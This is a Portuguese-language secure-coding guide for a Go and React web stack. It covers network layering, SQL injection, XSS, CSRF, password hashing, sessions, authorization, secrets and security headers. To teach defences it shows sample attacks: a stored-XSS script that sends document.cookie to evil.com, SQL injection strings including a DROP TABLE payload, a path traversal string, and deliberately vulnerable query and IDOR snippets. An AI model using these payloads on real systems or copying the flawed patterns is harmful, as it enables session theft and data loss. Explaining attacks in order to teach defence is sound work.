# Segurança da Informação — Sistema Minimamente Seguro em 2026

> **TL;DR:** Segurança não é uma feature, é uma propriedade da arquitetura. Os princípios (defesa em profundidade, menor privilégio, nunca confiar no cliente) são eternos; as ferramentas (argon2, TLS 1.3, CSP) são a implementação atual deles.

**Conecta com:** [startProjects.md](../startProjects.md) (DTOs, HttpOnly) · [apis-rest.md](../backend/apis-rest.md) (validação, erros) · [protocolo-http.md](../backend/protocolo-http.md) (headers) · [redes-de-computadores.md](../redes/redes-de-computadores.md) (subnets, firewall) · [aws-infraestrutura.md](../aws/aws-infraestrutura.md) (VPC privada)

---

## 1. Os 4 princípios eternos

1. **Nunca confie no cliente.** Todo byte vindo do browser é potencialmente hostil: o front que você escreveu não é o único cliente possível — curl, Burp Suite e scripts falam com sua API igualzinho. Validação no React é UX; a validação que conta vive no Go.
2. **Defesa em profundidade.** Nenhuma camada é confiável sozinha; cada uma assume que a anterior falhou. Prepared statement **e** validação de entrada **e** usuário do banco com privilégio mínimo **e** banco em subnet privada. O atacante precisa furar todas.
3. **Menor privilégio.** Cada componente (usuário, serviço, container, credencial de banco) tem o mínimo de permissão para funcionar. A pergunta em cada acesso: "precisa mesmo?"
4. **Superfície de ataque mínima.** Cada porta aberta, endpoint, dependência e feature é superfície. O código mais seguro é o que não existe; a porta mais segura é a fechada.

## 2. Threat modeling rápido (STRIDE simplificado)

Antes de cada feature, 5 minutos nestas perguntas:

| Ameaça | Pergunta | Defesa típica |
|---|---|---|
| **S**poofing | alguém pode fingir ser outro usuário? | autenticação de sessão |
| **T**ampering | pode alterar dados em trânsito/repouso? | TLS, validação, autorização |
| **R**epudiation | pode negar que fez algo? | logs de auditoria |
| **I**nformation disclosure | dado vaza para quem não devia? | DTOs, 404 vs 403, criptografia |
| **D**enial of service | pode derrubar o sistema? | rate limit, timeouts, limites de payload |
| **E**levation of privilege | usuário comum vira admin? | autorização no servidor, RBAC |

## 3. Arquitetura segura: separação front/back e rede em camadas

O desenho que elimina classes inteiras de ataque:

```
Internet
   │ :443 (única porta pública)
┌──▼──────────────────────────┐
│ Edge: CDN/LB + TLS + WAF    │  ← subnet PÚBLICA (única coisa com IP público)
└──┬──────────────────────────┘
   │ :8080 (só aceita do LB — security group)
┌──▼──────────────────────────┐
│ API Go (containers)         │  ← subnet PRIVADA (sem IP público, sem SSH aberto)
└──┬──────────────────────────┘
   │ :5432 (só aceita da API)
┌──▼──────────────────────────┐
│ Postgres + Redis            │  ← subnet PRIVADA isolada (nunca, JAMAIS, internet)
└─────────────────────────────┘
```

Regras não-negociáveis:

- **Banco de dados nunca tem IP público.** A maioria dos vazamentos históricos (MongoDB, Elasticsearch abertos) foi banco exposto na internet com senha fraca ou sem senha. O banco só aceita conexão do security group da API, ponto.
- **Front-end é estático** (build do Vite servido por CDN) — não existe servidor de front para invadir. Toda lógica sensível está no Go, atrás do LB.
- Acesso administrativo ao banco: via bastion/SSM tunnel, nunca porta aberta "só para o meu IP" (IPs mudam, regras ficam).
- Cada salto tem firewall (security group) permitindo **apenas** a origem e porta esperadas.

Implementação AWS concreta em [aws-infraestrutura.md](../aws/aws-infraestrutura.md); fundamentos de subnet/CIDR em [redes-de-computadores.md](../redes/redes-de-computadores.md).

## 4. SQL Injection — como funciona e como morrer para ela

### O ataque
Query montada por concatenação transforma dado em código:

```go
// VULNERÁVEL — NUNCA FAÇA
query := "SELECT * FROM users WHERE email = '" + email + "'"
// atacante envia: ' OR '1'='1' --
// query vira: SELECT * FROM users WHERE email = '' OR '1'='1' --'
// → retorna todos os usuários. Variações: UNION SELECT (exfiltra outras
//   tabelas), '; DROP TABLE users;-- (destrói), pg_sleep(10) (blind)
```

### A defesa: prepared statements — dado NUNCA vira código

```go
// SEGURO — o driver envia query e parâmetros SEPARADOS ao Postgres.
// O valor jamais é interpretado como SQL, não importa o conteúdo.
row := db.QueryRowContext(ctx,
	"SELECT id, name, email FROM users WHERE email = $1", email)
```

Camadas complementares (defesa em profundidade):

1. **`$1` placeholders em 100% das queries.** Proíba `fmt.Sprintf` com SQL em code review. Casos dinâmicos (ORDER BY por coluna) usam **allowlist**: `map[string]string{"name": "name", "date": "created_at"}` — nunca o valor do usuário na string.
2. **sqlc** (recomendado na stack): você escreve SQL estático, ele gera código Go tipado e reduz drasticamente a superfície de injeção mantendo o SQL visível/otimizável. Trechos dinâmicos e queries manuais continuam exigindo allowlist/placeholders.
3. **Usuário do banco com privilégio mínimo:** a aplicação conecta com usuário que tem `SELECT/INSERT/UPDATE/DELETE` nas tabelas dela — sem `DROP`, sem `CREATE`, sem acesso a `pg_catalog` além do necessário, sem superuser. Injeção que passar acha um usuário manco.
4. Erros de banco **nunca** vão na resposta HTTP (vazam schema); vão para o log.

## 5. XSS — scripts maliciosos no browser

### O ataque
Atacante injeta JS que executa no browser **de outra vítima**, com a sessão dela:

- **Stored:** comentário salvo contendo `<script>fetch('https://evil.com?c='+document.cookie)</script>` — executa para todo mundo que abrir a página.
- **Reflected:** payload na URL refletido na página (`/busca?q=<script>...`).
- **DOM-based:** o próprio JS do front insere dado não confiável no DOM.

### As defesas em camadas

**Camada 1 — React escapa por padrão.** `{userInput}` em JSX vira texto, nunca HTML. Você perde essa proteção em exatamente estes pontos — os únicos que exigem atenção:

```tsx
// ❌ A porta do XSS — proíba em code review, exceção só com sanitização
<div dangerouslySetInnerHTML={{ __html: userContent }} />
// Se PRECISA renderizar HTML rico (editor WYSIWYG): sanitize antes com DOMPurify
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userContent) }} />

// ❌ URL controlada pelo usuário: javascript:alert(1) é uma URL válida
<a href={userProvidedUrl}>   // valide: só http:// e https:// passam
```

**Camada 2 — Content-Security-Policy:** mesmo que um script injete, o browser recusa executar o que a política não permite:

```
Content-Security-Policy: default-src 'self'; script-src 'self';
  style-src 'self' 'unsafe-inline'; img-src 'self' data: https:;
  object-src 'none'; base-uri 'self'; frame-ancestors 'none'
```

- `script-src 'self'`: só scripts do próprio domínio — script inline injetado morre aqui. É a defesa que salva quando a camada 1 falha.
- `frame-ancestors 'none'`: ninguém põe seu site em iframe (mata clickjacking).
- Comece com `Content-Security-Policy-Report-Only` para ver o que quebraria antes de ativar.

**Camada 3 — cookie HttpOnly:** mesmo com XSS rodando, `document.cookie` não alcança a sessão (nossa arquitetura de [startProjects.md](../startProjects.md)). O XSS ainda pode agir *enquanto a página está aberta* (fazer requests como a vítima) — por isso HttpOnly **mitiga**, não elimina; as camadas 1 e 2 continuam necessárias.

**Camada 4 — validação de entrada no Go:** comentário aceita texto de até 2000 chars; nome não aceita `<`. Não substitui escaping na saída, mas reduz o que entra.

## 6. CSRF

Ataque: site malicioso faz o browser da vítima logada enviar request ao seu sistema (o browser anexa cookies automaticamente). Defesas na nossa stack:

1. **`SameSite=Strict` no cookie de sessão** — bloqueia o envio no CSRF clássico **cross-site** nos browsers modernos. Subdomínios irmãos ainda são “same-site”, e integrações/fluxos podem exigir `Lax`/`None`; modele essas exceções.
2. **CORS restritivo** — `Access-Control-Allow-Origin` de origem única impede que JS de outro site *leia* respostas.
3. Mutações **nunca via GET** (GET cross-site sempre leva cookie SameSite=Lax/None; e prefetch executa GETs).
4. Cheque o header `Origin`/`Sec-Fetch-Site` em mutações como cinto extra (custa 3 linhas de middleware).

Para SPA + API estritamente same-origin, sem subdomínio não confiável, com `SameSite=Strict` **e validação de `Origin`**, token CSRF pode ser redundante. Fora dessas condições — cookie `Lax`/`None`, browser legado, sibling subdomain ou fluxo cross-site — use token/padrão CSRF adequado. CORS sozinho impede leitura por JS; não impede todo envio.

## 7. Autenticação

### Armazenamento de senha — hashing lento e com sal

Senha **nunca** é armazenada, nem criptografada (criptografia é reversível) — é *hasheada* com função **propositalmente lenta** (GPU do atacante testa bilhões de MD5/s, mas só dezenas de argon2/s):

```go
// Núcleo Argon2id: salt deve ser aleatório por senha (>= 16 bytes).
// Parâmetros são ponto inicial e precisam de benchmark no seu hardware.
import "golang.org/x/crypto/argon2"
hash := argon2.IDKey([]byte(password), salt, 1, 64*1024, 4, 32)

// bcrypt (cost 12+) segue aceitável e mais simples — inclui sal automático:
import "golang.org/x/crypto/bcrypt"
hash, _ := bcrypt.GenerateFromPassword([]byte(password), 12)
err := bcrypt.CompareHashAndPassword(hash, []byte(attempt)) // compare SEMPRE por aqui
```

- **Sal** (aleatório por usuário): senhas iguais geram hashes diferentes. Armazene formato versionado contendo algoritmo, parâmetros, salt e hash (ex.: PHC) para verificar e rehashar depois.
- Política atual do [NIST SP 800-63B-4](https://pages.nist.gov/800-63-4/sp800-63b/authenticators/): mínimo **15 caracteres** quando senha é fator único; pode ser 8 quando faz parte de MFA. Aceite pelo menos 64, cheque lista de senhas vazadas e evite composição/expiração periódica arbitrárias.

### Sessões server-side vs JWT

| | Sessão (cookie HttpOnly + store) | JWT stateless |
|---|---|---|
| Revogação | imediata (deleta do store) | não é nativa; expiração curta/denylist/introspection adicionam estado |
| Logout real | ✅ | ❌ |
| Dado da sessão | no servidor | no token (legível por qualquer um — base64, não criptografia!) |
| Custo por request | 1 lookup Redis (~0,2ms) | 0 lookup |
| Quando | **padrão para web app** | serviço↔serviço, APIs de terceiros, multi-domínio |

⚠️ **JWT em localStorage para web app é um over-engineering inseguro comum:** é roubável por XSS e revogação exige expiração curta/estado extra, enquanto resolve um lookup de sessão que esta stack não precisa evitar. Cookie HttpOnly + store no Redis/Postgres é mais simples aqui. JWT tem seu lugar — não é esse.

### Higiene de sessão
- ID de sessão: 128+ bits do `crypto/rand` (nunca `math/rand`, nunca sequencial).
- **Regenerar o ID no login** (mata session fixation).
- Expiração: idle timeout (ex: 7 dias sem uso) + absoluto (ex: 30 dias).
- Logout deleta no servidor, não só o cookie.

### Contra força bruta e enumeração
- Rate limit em `/login`: ~5 tentativas/min por conta E por IP, com backoff.
- Mensagem idêntica para "email não existe" e "senha errada": `"credenciais inválidas"`. No "esqueci a senha": `"se o email existir, enviamos instruções"` — sempre a mesma resposta, e cuidado com **timing** (compare hash mesmo se o usuário não existir, senão a diferença de tempo entrega quem está cadastrado).
- MFA (TOTP) para contas administrativas no mínimo.

## 8. Autorização — a falha nº 1 em APIs reais

Autenticação = quem é você. Autorização = o que você **pode**. A vulnerabilidade mais explorada em APIs modernas não é injection — é **IDOR/BOLA** (Broken Object Level Authorization):

```go
// VULNERÁVEL: autentica, mas não autoriza
order, _ := repo.GetOrder(orderID)   // /api/orders/981 → e /api/orders/982?
                                     // usuário troca o ID e lê pedido alheio

// CORRETO: TODA query de recurso carrega o dono na cláusula
order, err := repo.GetOrderForUser(ctx, orderID, user.ID)
// SELECT ... FROM orders WHERE id = $1 AND user_id = $2
// não achou → 404 (não 403 — não confirme que o recurso existe)
```

Regras:
- Identidade **sempre** do middleware de sessão (context), **nunca** de campo do payload/query (`?user_id=` é o cliente escolhendo quem ser).
- RBAC simples resolve 95%: coluna `role` + middleware `RequireRole("admin")`. ⚠️ Engine de permissões genérica (Casbin, OPA) antes de ter requisito real é over-engineering.
- Esconder botão no React **não é autorização** — é cosmética. A checagem que vale está no Go.
- IDs sequenciais facilitam enumeração; UUIDs dificultam — mas UUID **não substitui** a checagem de dono.

## 9. Segredos e configuração

- Segredo **nunca** entra no git — nem "só nesse commit" (histórico é eterno; bots varrem GitHub por `AWS_SECRET` em segundos). Vazou? **Rotacione imediatamente**, não adianta só apagar o arquivo.
- Local: `.env` (no `.gitignore`) + `.env.example` versionado com chaves vazias.
- Produção: secrets manager (AWS Secrets Manager/Parameter Store, Vault) injetando em env var do container — nunca "hardcodado temporariamente".
- Detecção preventiva: `gitleaks` como pre-commit hook e no CI.
- **Front-end não tem segredos.** Toda env var `VITE_*` entra no bundle público — chave de API paga vai no Go, que faz proxy da chamada.

## 10. TLS/HTTPS

- HTTPS em **tudo**, incluindo dev quando possível. Certificado: Let's Encrypt/ACM — gratuito e automático, zero desculpa.
- Redirect 80→443 + HSTS (força HTTPS mesmo se o usuário digitar http):
  ```
  Strict-Transport-Security: max-age=63072000; includeSubDomains
  ```
- TLS 1.2 mínimo, 1.3 preferido. Terminação no LB/CDN; handshake explicado em [redes-de-computadores.md](../redes/redes-de-computadores.md).
- ⚠️ mTLS entre serviços internos de um sistema pequeno em VPC privada é over-engineering — a subnet privada + security groups já isolam; mTLS entra em compliance pesado ou zero-trust multi-tenant.

## 11. Headers de segurança — middleware Go completo

```go
func SecurityHeaders(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		h := w.Header()
		h.Set("Strict-Transport-Security", "max-age=63072000; includeSubDomains")
		h.Set("Content-Security-Policy",
			"default-src 'self'; script-src 'self'; object-src 'none'; "+
				"base-uri 'self'; frame-ancestors 'none'")
		h.Set("X-Content-Type-Options", "nosniff") // browser não "adivinha" MIME
		h.Set("Referrer-Policy", "strict-origin-when-cross-origin")
		h.Set("X-Frame-Options", "DENY")           // legado do frame-ancestors
		next.ServeHTTP(w, r)
	})
}
```

Valide o resultado em https://securityheaders.com (nota A é alcançável em uma tarde).

## 12. Validação de entrada no Go

- **Allowlist, não blocklist:** defina o que É válido ("email: formato RFC, ≤254 chars"), não o que é proibido (blocklists sempre têm bypass).
- Valide **tipo, tamanho, formato e faixa** de todo campo no service. Struct tags + `go-playground/validator` padronizam:
  ```go
  type CreateOrderRequest struct {
  	ProductID int64 `json:"product_id" validate:"required,gt=0"`
  	Qty       int   `json:"qty"        validate:"required,gt=0,lte=100"`
  }
  ```
- `DisallowUnknownFields` + `MaxBytesReader` em todo decode (ver [apis-rest.md](../backend/apis-rest.md#9-anatomia-de-um-handler-go-de-produção)).
- Upload de arquivo: valide extensão E magic bytes, limite tamanho, gere nome novo (nunca use o nome enviado — path traversal `../../etc/cron.d/x`), sirva de domínio/bucket separado.

## 13. Rate limiting e anti-DoS

- Token bucket por IP (anônimo) e por usuário (logado); login/registro/reset com limites agressivos.
- Timeouts do servidor HTTP (anti-Slowloris) e `MaxBytesReader` — ver [protocolo-http.md](../backend/protocolo-http.md#7-http-no-go--o-que-separa-produção-de-tutorial).
- Paginação com limite máximo imposto — endpoint sem limite é DoS de graça.
- DDoS volumétrico se resolve no edge (CloudFront/Cloudflare absorvem), não no seu Go. ⚠️ WAF pago no MVP é over-engineering; rate limit + edge grátis cobrem o começo.

## 14. Dependências e supply chain

Seu sistema inclui todo o código que você importa:

- `govulncheck ./...` (Go, oficial — só acusa vulnerabilidade em código que você **realmente chama**) e `npm audit` no CI.
- Lockfiles (`go.sum`, `package-lock.json`) **sempre** commitados — garantem build reproduzível e detectam pacote adulterado.
- Dependabot/Renovate para PRs automáticos de atualização (a maioria das invasões usa vulnerabilidade **conhecida e já corrigida** — atualizar é a defesa).
- Antes de adicionar dependência: precisa mesmo? (stdlib do Go cobre muito), é mantida? quantas dependências transitivas traz? Menos dependência = menos superfície.

## 15. Logs e auditoria

**Logue** (estruturado, JSON via `slog`): login (sucesso/falha, IP), mudanças de permissão, ações administrativas, acessos negados (403/401 em volume = ataque em andamento), erros 5xx com request ID.

**NUNCA logue:** senhas (nem erradas — usuário erra digitando a certa), tokens de sessão, cookies, corpo de cartão/documento, PII desnecessária. Vazamento de log é vazamento de dados — log é dado sensível com controle de acesso próprio e retenção definida.

## 16. ⚠️ Tabela de over-engineering em segurança

| Tentação | Suficiente na prática |
|---|---|
| JWT + refresh token rotation p/ web app | cookie HttpOnly + sessão server-side |
| mTLS interno em VPC pequena | security groups + subnet privada |
| Engine de permissão genérica (OPA/Casbin) day-1 | coluna `role` + middleware RequireRole |
| WAF enterprise no MVP | rate limit + headers + validação + edge grátis |
| Criptografar campo a campo no banco | TDE/criptografia de disco + acesso mínimo (campo a campo só p/ dados ultra-sensíveis) |
| Vault self-hosted p/ 5 segredos | Secrets Manager/Parameter Store gerenciado |
| Token CSRF em SPA SameSite=Strict | SameSite=Strict + checagem de Origin |

Segurança de verdade é fazer o **básico com disciplina absoluta** — as brechas reais vêm de banco exposto, dependência desatualizada, IDOR e segredo no git, não da falta de mTLS.

## 17. Checklist mestre

**Arquitetura**
- [ ] Banco sem IP público; cada camada só aceita da anterior
- [ ] Front estático; toda lógica/validação/autorização no Go
- [ ] HTTPS everywhere + HSTS; redirect 80→443

**Código**
- [ ] 100% das queries com placeholders (ou sqlc); zero SQL concatenado
- [ ] `dangerouslySetInnerHTML` proibido sem DOMPurify; URLs de usuário validadas
- [ ] CSP ativa; headers de segurança (nota A no securityheaders.com)
- [ ] Toda query de recurso filtra por dono (`AND user_id = $1`); identidade só do middleware
- [ ] Validação allowlist + `DisallowUnknownFields` + `MaxBytesReader`

**Autenticação**
- [ ] Argon2id com salt aleatório, parâmetros registrados/benchmarkados e rehash; IDs de sessão de `crypto/rand`, regenerados no login
- [ ] Cookie `HttpOnly; Secure; SameSite=Strict`; logout server-side
- [ ] Rate limit agressivo em login/reset; mensagens que não enumeram contas

**Operação**
- [ ] Zero segredos no git (gitleaks no CI); secrets manager em produção
- [ ] `govulncheck` + `npm audit` no CI; Dependabot ativo; lockfiles commitados
- [ ] Logs de auditoria sem dados sensíveis; alertas em picos de 401/403/5xx
